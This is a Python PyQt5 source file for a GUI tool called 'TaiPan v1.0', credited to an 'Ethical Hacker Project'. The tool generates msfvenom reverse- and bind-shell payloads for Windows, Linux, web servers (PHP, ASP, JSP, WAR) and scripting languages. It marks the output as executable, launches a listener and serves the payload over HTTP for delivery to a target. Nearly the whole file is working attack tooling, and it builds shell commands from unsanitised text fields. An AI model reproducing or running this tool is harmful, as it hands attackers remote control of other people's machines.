#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Created by Ethical Hacker Project

import os
import sys

from PyQt5.QtGui import QFont,QIcon, QPixmap,QMovie
from PyQt5.QtWidgets import QWidget,QApplication,QMessageBox,QLabel,QComboBox,QPushButton,QRadioButton,QLineEdit,QFileDialog,QCheckBox
from PyQt5.QtCore import QRect,QCoreApplication,QMetaObject,Qt
from PyQt5 import QtCore, QtGui, QtWidgets
import subprocess




#payloads list
#windows payloads
windows_payloads = [
    'shell_reverse_tcp',  
    'shell_bind_tcp', 
]

#linux payloads
linux_payloads = [
     'shell_reverse_tcp',  
     'shell_bind_tcp',  
]

#web payloads
web_reverse_payloads = [
     'php',
     'asp',
     'jsp',
     'war'
]

#script payloads
script_reverse_payloads = [
     'bash',
     'python',
     'perl',
     'nodejs',
     'jar'
]

#global payloads settings
global msfvenom_command
global p_payload
global p_arch
global LHOST
global LPORT
global RHOST
global RPORT



class Ui_Form(object):
    def setupUi(self, Form):
        Form.setObjectName("Form")
        Form.resize(537, 428)
        font = QFont()
        font.setFamily("Old Antic Bold")            #font family
        font.setStrikeOut(False)
        Form.setFont(font)
        self.label = QLabel(Form)
        self.label.setGeometry(QRect(20, 100, 101, 31))         #x,y,widht,height
        font = QFont()
        font.setPointSize(13)
        font.setBold(False)
        font.setWeight(50)
        self.label.setFont(font)
        self.label.setTextFormat(Qt.AutoText)
        self.label.setObjectName("label")
        self.label_3 = QLabel(Form)
        self.label_3.setGeometry(QRect(20, 150, 91, 21))
        font = QFont()
        font.setPointSize(13)
        font.setBold(False)
        font.setWeight(50)
        self.label_3.setFont(font)
        self.label_3.setObjectName("label_2")
        self.label_2 = QLabel(Form)
        self.label_2.setGeometry(QRect(20, 190, 91, 20))
        font = QFont()
        font.setPointSize(13)
        self.label_2.setFont(font)
        self.label_2.setObjectName("label_3")
        self.comboBox_platform = QComboBox(Form)                #combobox --> dropdown menu
        self.comboBox_platform.setGeometry(QRect(130, 100, 181, 31))
        font = QFont()
        font.setStrikeOut(False)
        self.comboBox_platform.setFont(font)
        self.comboBox_platform.setMouseTracking(False)
        self.comboBox_platform.setAutoFillBackground(True)
        self.comboBox_platform.setObjectName("comboBox_platform")
        self.comboBox_platform.addItem("")
        self.comboBox_platform.addItem("")
        self.comboBox_platform.addItem("")
        self.comboBox_platform.addItem("")
        self.pushButton = QPushButton(Form)
        self.pushButton.setGeometry(QRect(90, 400, 151, 41))
        self.pushButton.setObjectName("pushButton")
        self.pushButton_2 = QPushButton(Form)
        self.pushButton_2.setGeometry(QRect(410, 400, 151, 41))
        self.pushButton_2.setObjectName("pushButton_2")
        self.label_4 = QLabel(Form)
        self.label_4.setGeometry(QRect(150, 20, 250, 51))
        font = QFont()
        font.setFamily("Old Antic Bold")
        font.setPointSize(27)
        font.setBold(True)
        font.setWeight(75)
        self.label_4.setFont(font)
        self.label_4.setObjectName("label_4")
        self.comboBox_payload = QComboBox(Form)
        self.comboBox_payload.setGeometry(QRect(130, 190, 271, 31))
        self.comboBox_payload.setObjectName("comboBox_payload")
        self.radioButton_86 = QRadioButton(Form)
        self.radioButton_86.setGeometry(QRect(130, 150, 119, 25))
        self.radioButton_86.setObjectName("radioButton_86")         #architecture radio button
        self.radioButton_64 = QRadioButton(Form)
        self.radioButton_64.setGeometry(QRect(250, 150, 119, 25))
        self.radioButton_64.setChecked(True)
        self.radioButton_64.setObjectName("radioButton_64")
        self.label_5 = QLabel(Form)
        self.label_5.setGeometry(QRect(20, 235, 91, 31))
        font = QFont()
        font.setPointSize(13)
        self.label_5.setFont(font)
        self.label_5.setObjectName("label_5")
        self.label_6 = QLabel(Form)
        self.label_6.setGeometry(QRect(290, 280, 71, 21))
        self.label_6.setObjectName("label_6")
        self.label_7 = QLabel(Form)
        self.label_7.setGeometry(QRect(290, 325, 71, 20))
        self.label_7.setObjectName("label_7")
        self.label_8 = QLabel(Form)
        self.label_8.setGeometry(QRect(60, 280, 71, 20))
        self.label_8.setObjectName("label_8")
        self.label_9 = QLabel(Form)
        self.label_9.setGeometry(QRect(60, 325, 71, 20))
        self.label_9.setObjectName("label_9")
        self.lineEdit_lhost = QLineEdit(Form)
        self.lineEdit_lhost.setGeometry(QRect(130, 280, 131, 21))
        self.lineEdit_lhost.setObjectName("lineEdit_lhost")
        self.lineEdit_lport = QLineEdit(Form)
        self.lineEdit_lport.setGeometry(QRect(130, 325, 131, 21))
        self.lineEdit_lport.setObjectName("lineEdit_lport")
        self.lineEdit_rhost = QLineEdit(Form)
        self.lineEdit_rhost.setGeometry(QRect(360, 280, 141, 21))
        self.lineEdit_rhost.setObjectName("lineEdit_rhost")
        self.lineEdit_rport = QLineEdit(Form)
        self.lineEdit_rport.setGeometry(QRect(360, 325, 141, 21))
        self.lineEdit_rport.setObjectName("lineEdit_rport")
        self.pushButton_3 = QPushButton(Form)
        self.pushButton_3.setGeometry(QRect(250, 400, 151, 41))
        self.pushButton_3.setObjectName("pushButton_3")

        #Fixed image on screen
        #self.label_10 = QLabel(Form)
        #self.label_10.setGeometry(QtCore.QRect(400, 25, 250, 250))
        #self.label_10.setText("")
        #self.label_10.setPixmap(QtGui.QPixmap("logo2.png"))
        #self.label_10.setScaledContents(True)

        #Animated GIF on screen
        self.label_10 = QtWidgets.QLabel(Form)
        self.label_10.setGeometry(QtCore.QRect(400, 25, 250, 250))
        self.label_10.setObjectName("label_10")
        #self.retranslateUi(Form)
        
        self.retranslateUi(Form)
        self.comboBox_platform.currentIndexChanged['int'].connect(Form.setPlatform)
        self.pushButton_2.clicked.connect(Form.ExitTool)
        self.radioButton_86.clicked.connect(Form.setArch)
        self.radioButton_64.clicked.connect(Form.setArch)
        self.pushButton.clicked.connect(Form.GeneratePayload)
        self.pushButton_3.clicked.connect(Form.pythonServer)
        #QMetaObject.connectSlotsByName(Form)               #commented out for animated gif
        QtCore.QMetaObject.connectSlotsByName(Form)

    def retranslateUi(self, Form):
        #translating labels to text
        _translate = QtCore.QCoreApplication.translate
        #_translate = QCoreApplication.translate            #commented out for animated gif
        Form.setWindowTitle(_translate("Form", "Form"))
        self.label.setText(_translate("Form", "OS"))
        self.label_2.setText(_translate("Form", "Payload"))
        self.label_3.setText(_translate("Form", "Arch"))
        self.comboBox_platform.setItemText(0, _translate("Form", "Windows"))
        self.comboBox_platform.setItemText(1, _translate("Form", "Linux")) 
        self.comboBox_platform.setItemText(2, _translate("Form", "Web_Reverse_Shell"))
        self.comboBox_platform.setItemText(3, _translate("Form", "Script_Reverse_Shell"))
        self.pushButton.setText(_translate("Form", "Generate"))
        self.pushButton_2.setText(_translate("Form", "Exit"))
        self.label_4.setText(_translate("Form", "TaiPan v1.0"))
        self.radioButton_86.setText(_translate("Form", "x86"))
        self.radioButton_64.setText(_translate("Form", "x64"))
        self.label_5.setText(_translate("Form", "Parameters"))
        self.label_6.setText(_translate("Form", "RHOST"))
        self.label_7.setText(_translate("Form", "RPORT"))
        self.label_8.setText(_translate("Form", "LHOST"))
        self.label_9.setText(_translate("Form", "LPORT"))
        self.pushButton_3.setText(_translate("Form", "Serve Payload"))

class Mywindow(QWidget,Ui_Form):
    
    def __init__(self):    
        super(Mywindow,self).__init__()
        self.setStyleSheet("background-color: #2B2D2F; color: white ") ##39ff14
        self.setFixedSize(640, 480)         #fixed size for main window
        self.setupUi(self)
        self.comboBox_payload.addItems(windows_payloads)
        self.msfvenom_command = ""
        self.p_arch = self.setArch()
        self.p_payload = ""
        self.LHOST=""
        self.LPORT=""
        self.RHOST=""
        self.RPORT=""
        self.FILENAME=""

        #Animation for GIF
        self.gif = QMovie('venom_face3.gif')
        self.label_10.setMovie(self.gif)
        self.gif.start()

    #Define slot function
    def setPlatform(self):
        if self.comboBox_platform.currentText()== "Windows":
            self.comboBox_payload.clear()
            self.comboBox_payload.addItems(windows_payloads)

        elif self.comboBox_platform.currentText()== "Linux":
            self.comboBox_payload.clear()
            self.comboBox_payload.addItems(linux_payloads)

        elif self.comboBox_platform.currentText()== "Web_Reverse_Shell":
            self.comboBox_payload.clear()
            self.comboBox_payload.addItems(web_reverse_payloads)

        elif self.comboBox_platform.currentText()== "Script_Reverse_Shell":
            self.comboBox_payload.clear()
            self.comboBox_payload.addItems(script_reverse_payloads)

    def setArch(self):
        if self.radioButton_64.isChecked():
            return "x64"
        elif self.radioButton_86.isChecked():
            return "x86"
    
    def ExitTool(self):
        QCoreApplication.instance().quit()

    def GeneratePayload(self):
        self.setPayloadSettings()

        try:
            #payload will be saved on the tmp folder
            file_name,ok=QFileDialog.getSaveFileName(self,'Save','/tmp')
            if ok:
                f=open(file_name,'w')
                
        except :
            pass
        self.msfvenom_command = self.msfvenom_command + " > " + file_name
        self.FILENAME = file_name
        subprocess.call(['chmod', '0777', file_name])       #automates file created into executable
        
        # debug infomation
        print(self.msfvenom_command)
        print(self.p_payload)
        print(self.LHOST,self.LPORT)
        print(self.RHOST,self.RPORT)

        QMessageBox.about(self, "The Ethical Hacker Project", "Generating payload")
        if os.system(self.msfvenom_command) == 0:
            QMessageBox.about(self, "The Ethical Hacker Project", "Successfully generated payload!")
            #os.system('gnome-terminal -- nc -lvp ' +self.lineEdit_lport.text() ) # --> Uncomment if you rather use nc listener
            dirpath = os.getcwd() # gets current working directory 
            #opens new terminal with a python listener
            subprocess.call(['gnome-terminal', '-e', 'python3 '+ dirpath + '/listener.py '+ str(self.lineEdit_lport.text())])
        else:
            QMessageBox.about(self,"The Ethical Hacker Project", "Failed to generate payload!")

    #PythonServer port 80
    def pythonServer(self):
        os.system('gnome-terminal -- python -m SimpleHTTPServer 80')
        QMessageBox.about(self, "URL TO PAYLOAD","http://"+self.lineEdit_lhost.text()+self.FILENAME)


    def setPayloadSettings(self):
        #Windows payload
        if self.comboBox_platform.currentText()== "Windows":
            if self.comboBox_payload.currentText() == "messagebox":
                self.p_payload = "windows/"+self.comboBox_payload.currentText()
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" TEXT="+"\'hello, it is a test\'"+" -f exe"
            
            elif self.comboBox_payload.currentText() == "shell_bind_tcp":
                self.RHOST = self.lineEdit_rhost.text()
                self.RPORT = self.lineEdit_rport.text()
                if self.p_arch == 'x86':
                    self.p_payload = "windows/"+self.comboBox_payload.currentText()
                else:
                    self.p_payload = "windows/"+self.p_arch+"/"+self.comboBox_payload.currentText()
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" RHOST="+ self.lineEdit_lhost.text()+ " RPORT="+ self.lineEdit_lport.text()+" -f exe"
            else:
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                if self.p_arch == 'x86':
                    self.p_payload = "windows/"+self.comboBox_payload.currentText()
                else:
                    self.p_payload = "windows/"+self.p_arch+"/"+self.comboBox_payload.currentText()
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f exe"

        #Linux payload
        elif self.comboBox_platform.currentText()== "Linux":
            if self.comboBox_payload.currentText() == "shell_bind_tcp":
                self.RHOST = self.lineEdit_rhost.text()
                self.RPORT = self.lineEdit_rport.text()
                self.p_payload = "linux/"+self.p_arch+"/"+self.comboBox_payload.currentText()
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" RHOST="+ self.lineEdit_lhost.text()+ " RPORT="+ self.lineEdit_lport.text()+" -f elf"
            else:
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "linux/"+self.p_arch+"/"+self.comboBox_payload.currentText()
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f elf"

        #Web Reverse payload
        elif self.comboBox_platform.currentText()== "Web_Reverse_Shell":
            if self.comboBox_payload.currentText() == "php":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "php/reverse_php"
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f raw"

            elif self.comboBox_payload.currentText() == "jsp":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "java/jsp_shell_reverse_tcp"
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f raw"

            elif self.comboBox_payload.currentText() == "asp":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "windows/meterpreter/reverse_tcp"
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f asp"

            elif self.comboBox_payload.currentText() == "war":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "java/jsp_shell_reverse_tcp"
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f war"

        #Script Reverse payload
        elif self.comboBox_platform.currentText()== "Script_Reverse_Shell":
            if self.comboBox_payload.currentText() == "bash":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "cmd/unix/reverse_bash"
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f raw"
            elif self.comboBox_payload.currentText() == "python":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "python/shell_reverse_tcp"
                self.msfvenom_command = "msfvenom"+" -a python"+" -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f raw"
            elif self.comboBox_payload.currentText() == "perl":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "cmd/unix/reverse_perl"
                self.msfvenom_command = "msfvenom"+" -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f raw"
            elif self.comboBox_payload.currentText() == "nodejs":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "cmd/unix/reverse_nodejs"
                self.msfvenom_command = "msfvenom"+" -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f raw"
            elif self.comboBox_payload.currentText() == "jar":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "java/shell_reverse_tcp"
                self.msfvenom_command = "msfvenom"+" -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f jar"
def main():
    app = QApplication(sys.argv)
    window = Mywindow()
    window.setWindowTitle("By The Ethical Hacker Project")
    window.setWindowIcon(QIcon('logo.jpg'))
    window.show()
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()

        

